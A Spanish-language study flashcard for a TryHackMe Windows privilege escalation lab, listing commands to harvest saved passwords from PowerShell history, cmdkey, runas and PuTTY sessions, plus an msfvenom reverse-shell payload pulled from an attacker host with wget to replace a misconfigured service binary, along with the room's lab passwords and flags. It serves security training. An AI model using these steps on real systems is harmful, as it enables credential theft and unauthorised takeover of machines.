**Flashcard — Windows Privilege Escalation (THM Room)**

---

### Jerarquía de privilegios

* **System > Administrator > Standard users**

---

### Task 3: Harvesting Passwords

**Buscar archivos**

```cmd
dir "[file_name]" /s
```

**Cambiar directorio**

```cmd
cd C:\User\Jack\Desktop
```

**Imprimir archivo**

```cmd
type [file]
```

**Historial PowerShell**

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* Password `julia.jones` → `ZuperCkretPa5z`

**Credenciales IIS (web.config)**

```powershell
cmdkey /list
```

* Password `db_admin` → `098n0x35skjD3`

**Usar credenciales guardadas con runas**

```powershell
runas /savecred /user:mike.katz cmd.exe
dir "\flag*" /s
cd C:\Users\mike.katz\Desktop
type flag.txt
```

* Flag → `THM{WHAT_IS_MY_PASSWORD}`

**PuTTY sessions**

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

* Password `thom.smith` → `CoolPass2021`

---

### Task 4: Quick Wins

* Flag `taskusr1` → `THM{TASK_COMPLETED}`

---

### Task 5: Service Misconfigurations

#### Insecure Permissions on Service Executable

**Check config**

```cmd
sc qc WindowsScheduler
icacls "C:\PROGRA~2\SYSTEM~1\WService.exe"
```

**Payload**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.14.198 LPORT=4445 -f exe-service -o rev-svc.exe
sudo python3 -m http.server 8080
```

**Target machine**

```powershell
wget http://10.4.14.198:8080/rev-svc.exe -O rev-svc.exe
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

**Restart service**

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

**Flag**

```cmd
type C:\Users\svcusr1\Desktop\flag.txt
```

* `THM{AT_YOUR_SERVICE}`

---

#### Unquoted Service Paths

* Path vulnerable: `C:\MyProgramms\Disk Sorter Enterprise`

**Payload → rename primer token del path**

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

**Flag**

```cmd
type C:\Users\svcusr2\Desktop\flag.txt
```

* `THM{QUOTES_EVERYWHERE}`

---

#### Insecure Service Permissions

* Reemplazar binario con payload, otorgar permisos y reiniciar servicio.

**Flag**

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

* `THM{INSECURE_SVC_CONFIG}`

---
